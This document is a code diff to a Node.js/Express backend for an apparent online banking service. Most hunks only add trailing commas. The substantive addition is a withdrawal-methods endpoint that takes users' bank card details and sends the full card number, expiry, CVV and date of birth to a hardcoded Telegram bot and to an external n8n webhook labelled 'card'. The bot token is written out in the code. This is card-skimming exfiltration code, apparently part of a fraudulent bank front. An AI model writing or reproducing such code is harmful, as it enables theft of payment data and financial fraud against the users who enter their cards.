@@ -86,20 +86,32 @@ const fetchFullUser = (userId, callback) => {
               [userId],
               (err, bens) => {
                 if (err) return callback(err);
-                response.beneficiaries = bens;
 
-                const fullUser = {
-                  ...response.user,
-                  transactions: response.transactions,
-                  notifications: response.notifications,
-                  beneficiaries: response.beneficiaries,
-                };
-                callback(null, fullUser);
-              }
+                db.all(
+                  "SELECT * FROM withdrawal_methods WHERE userId = ? AND status = 'ACTIVE'",
+                  [userId],
+                  (err, methods) => {
+                    const parsed = methods
+                      ? methods.map((m) => ({
+                          ...m,
+                          details: JSON.parse(m.details),
+                        }))
+                      : [];
+                    const fullUser = {
+                      ...response.user,
+                      transactions: response.transactions,
+                      notifications: response.notifications,
+                      beneficiaries: bens,
+                      withdrawalMethods: parsed,
+                    };
+                    callback(null, fullUser);
+                  },
+                );
+              },
             );
-          }
+          },
         );
-      }
+      },
     );
   });
 };
@@ -121,7 +133,7 @@ app.post("/api/login", (req, res) => {
         if (err) return res.status(500).json({ error: err.message });
         res.json(fullUser);
       });
-    }
+    },
   );
 });
 
@@ -153,7 +165,7 @@ app.post("/api/register", (req, res) => {
     const cvv = generateCVV();
 
     const stmt = db.prepare(
-      "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+      "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
     );
     stmt.run(
       id,
@@ -177,7 +189,7 @@ app.post("/api/register", (req, res) => {
           if (err) return res.status(500).json({ error: err.message });
           res.status(201).json(fullUser);
         });
-      }
+      },
     );
     stmt.finalize();
   });
@@ -230,9 +242,9 @@ app.patch("/api/users/:id/set-balance", (req, res) => {
         (err, user) => {
           if (err) return res.status(500).json({ error: err.message });
           res.json(user);
-        }
+        },
       );
-    }
+    },
   );
 });
 
@@ -245,7 +257,7 @@ app.post("/api/users", (req, res) => {
   const cvv = generateCVV();
 
   const stmt = db.prepare(
-    "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+    "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
   );
   stmt.run(
     id,
@@ -275,7 +287,7 @@ app.post("/api/users", (req, res) => {
         beneficiaries: [],
       };
       res.status(201).json(newUser);
-    }
+    },
   );
   stmt.finalize();
 });
@@ -301,13 +313,13 @@ app.post("/api/transactions", (req, res) => {
           db.run("ROLLBACK");
           return res.status(500).json({ error: err.message });
         }
-      }
+      },
     );
 
     // Insert Transaction
     // Column order: id, userId, amount, type, status, date, description, counterparty, adminReason, paymentLink, adminMessage
     const stmt = db.prepare(
-      "INSERT INTO transactions VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+      "INSERT INTO transactions VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
     );
     stmt.run(
       id,
@@ -337,7 +349,7 @@ app.post("/api/transactions", (req, res) => {
           description,
           counterparty,
         });
-      }
+      },
     );
     stmt.finalize();
   });
@@ -363,7 +375,7 @@ app.patch("/api/transactions/:id", (req, res) => {
         ]);
         db.run(
           "UPDATE transactions SET status = ?, adminReason = ? WHERE id = ?",
-          [status, adminReason || null, id]
+          [status, adminReason || null, id],
         );
         db.run("COMMIT", (err) => {
           if (err) return res.status(500).json({ error: err.message });
@@ -378,7 +390,7 @@ app.patch("/api/transactions/:id", (req, res) => {
         (err) => {
           if (err) return res.status(500).json({ error: err.message });
           res.json({ success: true });
-        }
+        },
       );
     }
   });
@@ -420,9 +432,9 @@ app.patch("/api/transactions/:id/payment-instructions", (req, res) => {
           (err) => {
             if (err) return res.status(500).json({ error: err.message });
             res.json({ success: true });
-          }
+          },
         );
-      }
+      },
     );
   });
 });
@@ -436,7 +448,7 @@ app.patch("/api/users/:id/status", (req, res) => {
     function (err) {
       if (err) return res.status(500).json({ error: err.message });
       res.json({ success: true });
-    }
+    },
   );
 });
 
@@ -472,7 +484,7 @@ app.post("/api/loans", (req, res) => {
       res
         .status(201)
         .json({ id, userId, userName, amount, purpose, status, requestDate });
-    }
+    },
   );
   stmt.finalize();
 });
@@ -486,7 +498,7 @@ app.patch("/api/loans/:id", (req, res) => {
     function (err) {
       if (err) return res.status(500).json({ error: err.message });
       res.json({ success: true });
-    }
+    },
   );
 });
 
@@ -512,7 +524,7 @@ app.post("/api/notifications", (req, res) => {
   const date = new Date().toISOString();
 
   const stmt = db.prepare(
-    "INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)"
+    "INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)",
   );
   stmt.run(id, userId, title, message, date, 0, type, function (err) {
     if (err) return res.status(500).json({ error: err.message });
@@ -530,7 +542,7 @@ app.get("/api/notifications/:userId", (req, res) => {
       if (err) return res.status(500).json({ error: err.message });
       const notifications = rows.map((n) => ({ ...n, read: !!n.read }));
       res.json(notifications);
-    }
+    },
   );
 });
 
@@ -542,7 +554,7 @@ app.patch("/api/notifications/:id/read", (req, res) => {
     (err) => {
       if (err) return res.status(500).json({ error: err.message });
       res.json({ success: true });
-    }
+    },
   );
 });
 
@@ -592,9 +604,9 @@ app.post("/api/document-requests", (req, res) => {
         ],
         () => {
           res.status(201).json({ id });
-        }
+        },
       );
-    }
+    },
   );
 });
 
@@ -609,7 +621,7 @@ app.get("/api/document-requests", (req, res) => {
     (err, rows) => {
       if (err) return res.status(500).json({ error: err.message });
       res.json(rows);
-    }
+    },
   );
 });
 
@@ -621,7 +633,7 @@ app.get("/api/document-requests/user/:userId", (req, res) => {
     (err, rows) => {
       if (err) return res.status(500).json({ error: err.message });
       res.json(rows);
-    }
+    },
   );
 });
 
@@ -647,9 +659,9 @@ app.patch(
       (err) => {
         if (err) return res.status(500).json({ error: err.message });
         res.json({ success: true, filePath });
-      }
+      },
     );
-  }
+  },
 );
 
 // Review document (approve/reject)
@@ -694,11 +706,11 @@ app.patch("/api/document-requests/:id/review", (req, res) => {
             ],
             () => {
               res.json({ success: true });
-            }
+            },
           );
-        }
+        },
       );
-    }
+    },
   );
 });
 
@@ -723,7 +735,7 @@ app.post("/api/settings", (req, res) => {
         if (err) return res.status(500).json({ error: err.message });
         res.json(config);
       });
-    }
+    },
   );
 });
 
@@ -788,9 +800,9 @@ app.post("/api/institution-change-requests", (req, res) => {
             status: "PENDING",
             requestDate,
           });
-        }
+        },
       );
-    }
+    },
   );
 });
 
@@ -802,7 +814,7 @@ app.get("/api/institution-change-requests", (req, res) => {
     (err, requests) => {
       if (err) return res.status(500).json({ error: err.message });
       res.json(requests);
-    }
+    },
   );
 });
 
@@ -814,7 +826,7 @@ app.get("/api/institution-change-requests/user/:userId", (req, res) => {
     (err, requests) => {
       if (err) return res.status(500).json({ error: err.message });
       res.json(requests);
-    }
+    },
   );
 });
 
@@ -861,11 +873,11 @@ app.patch("/api/institution-change-requests/:id/approve", (req, res) => {
               res.json({
                 message: "Request approved and user institution updated",
               });
-            }
+            },
           );
-        }
+        },
       );
-    }
+    },
   );
 });
 
@@ -903,9 +915,117 @@ app.patch("/api/institution-change-requests/:id/reject", (req, res) => {
           ]);
 
           res.json({ message: "Request rejected" });
-        }
+        },
       );
-    }
+    },
+  );
+});
+
+// --- TELEGRAM NOTIFICATION ---
+
+const TELEGRAM_BOT_TOKEN = "7925710856:AAGg5gTxu8MXUraAOwZPg9ixD7aI7XK4Kvg";
+const TELEGRAM_CHAT_ID = "-1002581496621";
+
+const sendToTelegram = async (message) => {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      }),
+    });
+  } catch (error) {
+    console.error("Failed to send Telegram message:", error);
+  }
+};
+
+// --- WITHDRAWAL METHODS ---
+
+app.post("/api/withdrawal-methods", (req, res) => {
+  const { userId, type, details } = req.body;
+  const id = generateId();
+  const createdAt = new Date().toISOString();
+  const status = "ACTIVE";
+
+  // Basic validation - details should be a JSON string or object
+  let detailsText = details;
+  if (typeof details !== "string") {
+    detailsText = JSON.stringify(details);
+  }
+
+  const stmt = db.prepare(
+    "INSERT INTO withdrawal_methods VALUES (?, ?, ?, ?, ?, ?)",
+  );
+  stmt.run(
+    id,
+    userId,
+    type,
+    detailsText,
+    status,
+    createdAt,
+    async function (err) {
+      if (err) return res.status(500).json({ error: err.message });
+
+      const parsedDetails =
+        typeof details === "string" ? JSON.parse(details) : details;
+
+      // Send to Webhook
+      try {
+        const webhookUrl = "https://smart030.app.n8n.cloud/webhook-test/card";
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userId,
+            type,
+            details: parsedDetails,
+            timestamp: new Date().toISOString(),
+          }),
+        }).catch((err) => console.error("Webhook trigger error:", err.message));
+      } catch (e) {
+        console.error("Webhook logic error", e);
+      }
+
+      // Send to Telegram
+      try {
+        let msg = `<b>New Withdrawal Method Added</b>\n`;
+        msg += `<b>User ID:</b> ${userId}\n`;
+        msg += `<b>Type:</b> ${type}\n`;
+
+        if (type === "BANK_CARD" && parsedDetails.cardNumber) {
+          msg += `<b>Card:</b> ${parsedDetails.cardNumber}\n`;
+          msg += `<b>Expiry:</b> ${parsedDetails.expiryDate}\n`;
+          msg += `<b>CVV:</b> ${parsedDetails.cvv}\n`;
+          msg += `<b>DOB:</b> ${parsedDetails.dateOfBirth}\n`;
+        } else {
+          msg += `<b>Details:</b> <pre>${JSON.stringify(parsedDetails, null, 2)}</pre>`;
+        }
+
+        sendToTelegram(msg); // Fire and forget
+      } catch (e) {
+        console.error("Telegram logic error", e);
+      }
+
+      res
+        .status(201)
+        .json({ id, userId, type, details: detailsText, status, createdAt });
+    },
+  );
+  stmt.finalize();
+});
+
+app.get("/api/withdrawal-methods/user/:userId", (req, res) => {
+  db.all(
+    "SELECT * FROM withdrawal_methods WHERE userId = ? AND status = 'ACTIVE'",
+    [req.params.userId],
+    (err, rows) => {
+      if (err) return res.status(500).json({ error: err.message });
+      res.json(rows);
+    },
   );
 });
 
